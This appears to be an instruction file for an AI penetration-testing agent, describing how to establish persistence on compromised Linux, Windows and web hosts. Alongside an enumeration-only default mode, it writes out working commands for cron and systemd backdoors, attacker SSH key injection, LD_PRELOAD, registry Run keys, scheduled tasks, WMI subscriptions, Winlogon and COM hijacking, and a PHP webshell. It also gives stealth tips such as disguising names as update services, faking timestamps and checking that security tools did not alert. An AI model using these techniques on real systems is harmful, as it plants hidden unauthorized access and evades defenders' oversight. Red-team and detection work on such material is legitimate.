# Persistence Skill

## Overview
Establish and maintain access to compromised systems via OS-level, service-level, and web-based persistence mechanisms. Dual-mode: evidence-only validation (default) or active persistence deployment when authorized.

## Scope Rules
1. Only operate on explicitly authorized systems.
2. External targets: persistence actions require explicit authorization (`external_exploit=explicit_only`).
3. If persistence is **disabled** (default): evidence-only validation — enumerate persistence surfaces, document risks, no changes.
4. If persistence is **enabled**: deploy minimal, reversible mechanisms. Document every change and cleanup steps.
5. Never deploy more than one persistence method simultaneously unless instructed.
6. Always maintain a cleanup log of every change made.

## Decision Tree

```
Target access obtained → Check persistence authorization
├── DISABLED (default) → Evidence-only mode
│   ├── Enumerate persistence surfaces (cron, services, registry, startup)
│   ├── Identify writable persistence locations
│   ├── Assess existing persistence mechanisms (legitimate and suspicious)
│   └── Output: persistence_inventory.json, persistence_risks.json, findings.json
└── ENABLED → Active persistence mode
    ├── Assess target: OS, user context, security controls, stealth requirement
    ├── Select technique (see Decision Matrix below)
    ├── Deploy ONE mechanism → Verify survives reboot/logout
    ├── If interactive access created → populate handoff.json
    └── If cleanup enabled → remove all persistence → verify clean
```

### Technique Decision Matrix
| Context | Primary | Fallback | MITRE |
|---|---|---|---|
| Root + Linux | systemd service | cron | T1543.002, T1053.003 |
| User + Linux | cron + SSH keys + bashrc | at jobs | T1053.003, T1098.004, T1546.004 |
| SYSTEM + Windows | service or schtasks | WMI event subscription | T1543.003, T1053.005, T1546.003 |
| User + Windows | registry Run key | startup folder | T1547.001 |
| Web access only | webshell | DB trigger | T1505.003 |

## Methodology

### 1. Baseline Host Context (Both Modes)
- Confirm OS family, version, patch level, user context (root/SYSTEM/user).
- Identify security controls: EDR, AV, HIDS, auditd, Sysmon, AMSI.
- Map writable directories and available services.
- Record host metadata for evidence.

### 2. Enumerate Persistence Surfaces (Both Modes)

#### Linux Persistence Surface
- Cron: `crontab -l`, `ls -la /etc/cron.*`, `cat /etc/crontab` — (T1053.003)
- Systemd: `systemctl list-unit-files --type=service | grep enabled`, `systemctl list-timers --all` — (T1543.002)
- Shell profiles: `cat ~/.bashrc ~/.profile /etc/profile.d/*` — (T1546.004)
- SSH keys: `cat ~/.ssh/authorized_keys`, `ls -la /root/.ssh/` — (T1098.004)
- Init scripts: `ls /etc/init.d/`, `cat /etc/rc.local` — (T1037.004)
- Kernel modules: `lsmod`, `cat /etc/modules` — (T1547.006)
- LD_PRELOAD: `cat /etc/ld.so.preload`, `env | grep LD_PRELOAD` — (T1574.006)

#### Windows Persistence Surface
- Registry Run keys: `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"`, same for HKLM — (T1547.001)
- Scheduled tasks: `schtasks /query /fo LIST /v` — (T1053.005)
- Services: `sc query state= all`, `wmic service get name,startmode,pathname` — (T1543.003)
- Startup folders: `dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"` — (T1547.001)
- WMI subscriptions: `Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding` — (T1546.003)
- Winlogon: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — (T1547.004)

#### Web Persistence Surface
- Web roots: `find /var/www -name "*.php" -newer /var/www/html/index.php -mtime -7` — (T1505.003)
- Database: check for suspicious triggers, stored procedures, UDFs

**Evidence-only mode stops here** — output findings and exit.

### 3. Deploy Persistence (Enabled Mode Only)

#### 3a. Linux Persistence Techniques

**Cron Backdoors — T1053.003**
```bash
# Append to existing crontab (preserves current entries)
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/lib/update-notifier/check.sh") | crontab -

# System-wide cron (root)
echo "*/10 * * * * root /usr/lib/update-notifier/check.sh" > /etc/cron.d/update-check

# Verify
crontab -l
```
Stealth: name files like `logrotate-helper`, `apt-daily-check`. Avoid `/tmp` paths.

**Systemd Service — T1543.002**
```bash
cat > /etc/systemd/system/update-helper.service << 'EOF'
[Unit]
Description=System Update Helper
After=network.target
[Service]
Type=simple
ExecStart=/usr/lib/update-helper/svc
Restart=on-failure
RestartSec=30
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now update-helper.service
```
Systemd timer alternative:
```bash
cat > /etc/systemd/system/update-helper.timer << 'EOF'
[Unit]
Description=Update Helper Timer
[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
EOF
systemctl enable --now update-helper.timer
```
Stealth: place binary in `/usr/lib/update-helper/`, match timestamps with `touch -r /usr/lib/systemd/systemd`.

**Shell Profile Hooks — T1546.004**
```bash
echo 'nohup /usr/lib/update-helper/svc >/dev/null 2>&1 &' >> ~/.bashrc
echo '[ -x /usr/lib/update-check ] && /usr/lib/update-check &' > /etc/profile.d/update-check.sh
chmod 644 /etc/profile.d/update-check.sh
```

**SSH Authorized Keys — T1098.004**
```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAA...attacker-key..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
If SSH creates interactive access → populate `handoff.json` with connection string.

**LD_PRELOAD — T1574.006**
```bash
gcc -shared -fPIC -o /usr/lib/libupdate.so payload.c -ldl
echo "/usr/lib/libupdate.so" >> /etc/ld.so.preload
```
Uses `__attribute__((constructor))` — executes on every dynamically linked binary load.

**PAM Backdoor — T1556.003**
```bash
# Patch pam_unix.so to accept hardcoded password alongside real one
# 1. find / -name "pam_unix.so" 2>/dev/null
# 2. Patch source, compile, replace. Match permissions and timestamp.
```
Warning: high risk of bricking auth. Lab-test only.

**Init Scripts / rc.local — T1037.004**
```bash
echo '/usr/lib/update-helper/svc &' >> /etc/rc.local && chmod +x /etc/rc.local
```

**Kernel Modules — T1547.006**
```bash
insmod /lib/modules/$(uname -r)/kernel/drivers/net/e1000e_helper.ko
echo "e1000e_helper" >> /etc/modules
```
Most stealthy (kernel space), most complex. Name module like legitimate driver.

**At Jobs — T1053.001**
```bash
echo "/usr/lib/update-helper/svc" | at now + 1 minute
```

#### 3b. Windows Persistence Techniques

**Registry Run Keys — T1547.001**
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateHelper /t REG_SZ /d "C:\ProgramData\update\svc.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateHelper /t REG_SZ /d "C:\ProgramData\update\svc.exe" /f
```

**Scheduled Tasks — T1053.005**
```cmd
schtasks /create /sc minute /mo 5 /tn "Microsoft\Windows\UpdateOrchestrator\UpdateCheck" /tr "C:\ProgramData\update\svc.exe" /ru SYSTEM /f
```
PowerShell:
```powershell
$a = New-ScheduledTaskAction -Execute "C:\ProgramData\update\svc.exe"
$t = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "UpdateService" -Action $a -Trigger $t -User "SYSTEM" -RunLevel Highest
```

**WMI Event Subscription — T1546.003**
```powershell
$f = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name="CoreFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
}
$c = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name="CoreConsumer"; CommandLineTemplate="C:\ProgramData\update\svc.exe"
}
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}
```

**Service Creation — T1543.003**
```cmd
sc create UpdateSvc binpath= "C:\ProgramData\update\svc.exe" start= auto DisplayName= "Windows Update Helper"
sc description UpdateSvc "Provides system update coordination services."
sc start UpdateSvc
```

**DLL Hijacking — T1574.001**
1. Find missing DLL: Process Monitor → filter `NAME NOT FOUND` + `.dll`
2. Create DLL with matching exports (proxy pattern)
3. Place in application directory (searched before System32)

**Startup Folder — T1547.001**
```cmd
copy C:\ProgramData\update\svc.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe"
```

**Winlogon Helper — T1547.004**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\ProgramData\update\svc.exe" /f
```
Warning: can brick the system. Test carefully.

**COM Hijacking — T1546.015**
```cmd
reg add "HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InProcServer32" /ve /t REG_SZ /d "C:\ProgramData\update\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\{TARGET-CLSID}\InProcServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
```

#### 3c. Web Persistence — T1505.003
See `references/web_persistence.md` for webshells (PHP/ASPX/JSP), database triggers, CMS backdoors.
```php
<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);} ?>
```

### 4. Verify Persistence
1. Simulate reboot/logout/session kill.
2. Confirm mechanism re-executes (callback received, shell available).
3. Test that security controls did not alert.
4. If persistence creates interactive access (SSH, WinRM, RDP) → populate `handoff.json`.

### 5. Cleanup (When Authorized or Engagement Complete)
1. Remove all deployed persistence (services, cron, registry, tasks, webshells).
2. Delete dropped payloads and binaries.
3. Kill spawned processes, remove PID files.
4. Revert any modified system files.
5. Verify cleanup with second-pass enumeration.
6. Cross-reference: `defense_evasion/references/artifact_cleanup.md`

## Deep Dives
Load references when needed:
1. Windows autorun locations: `references/windows_autoruns.md`
2. Windows services and tasks: `references/windows_services.md`
3. Windows registry persistence: `references/windows_registry.md`
4. Windows WMI persistence: `references/windows_wmi.md`
5. Linux persistence paths: `references/linux_persistence_paths.md`
6. Linux systemd units: `references/linux_systemd.md`
7. Linux cron and timers: `references/linux_cron.md`
8. Linux shell profiles: `references/linux_shell_profiles.md`
9. Linux SSH keys: `references/linux_ssh_keys.md`
10. Web persistence: `references/web_persistence.md`
11. Stealth techniques: `references/stealth_persistence.md`
12. Explicit-only actions: `references/explicit_only_actions.md`

## Evidence Collection
1. `persistence.json` — summarized persistence evidence and deployed mechanisms.
2. `persistence_inventory.json` — paths, tasks, services, owners discovered during enumeration.
3. `persistence_risks.json` — risky/writable locations and misconfigurations.
4. `evidence.json` — raw command outputs and supporting data.
5. `findings.json` — risk notes and remediation guidance.
6. `handoff.json` — interactive access commands created during persistence (SSH/WinRM/RDP connection strings for GUI session handoff).

## Evidence Consolidation
Use `normalize_persistence.py` to convert structured notes into `persistence_inventory.json`.
Summarize key risks into `persistence_risks.json`.

## Success Criteria
- Persistence locations inventoried safely (both modes).
- Risks documented with evidence (both modes).
- No unauthorized changes performed (disabled mode).
- Persistence mechanism survives reboot/logout (enabled mode).
- Mechanism evades active security controls (enabled mode, if stealth required).
- All changes documented for reliable cleanup (enabled mode).
- Cleanup verified with no residual artifacts (enabled mode).
